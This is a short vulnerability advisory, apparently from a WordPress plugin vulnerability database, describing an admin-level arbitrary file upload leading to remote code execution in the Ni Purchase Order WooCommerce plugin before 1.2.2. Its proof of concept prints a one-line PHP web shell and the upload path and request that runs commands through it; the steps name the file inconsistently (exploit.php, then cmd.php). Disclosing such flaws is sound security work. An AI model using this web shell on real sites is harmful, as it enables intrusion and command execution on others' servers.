## WordPress Plugin Vulnerabilities

# Ni Purchase Order(PO) For WooCommerce < 1.2.2 - Admin+ File Upload to Remote Code Execution

### Description

The plugin does not validate logo and signature image files uploaded in the settings, allowing high privileged user to upload arbitrary files to the web server, triggering an RCE vulnerability by uploading a web shell.

### Proof of Concept

1. Create a malicious file `exploit.php` with the contents `<?php echo system($\_GET['cmd']); ?>`
2. Visit https://example.com/wordpress/wp-admin/admin.php?page=niwoopo-setting
3. Select the `cmd.php` file in the Logo or Signature section and save the settings. The file will be accessible at https://example.com/wordpress/wp-content/uploads/ni-purchase-order/cmd.php?cmd=ls and it will show a directory listing
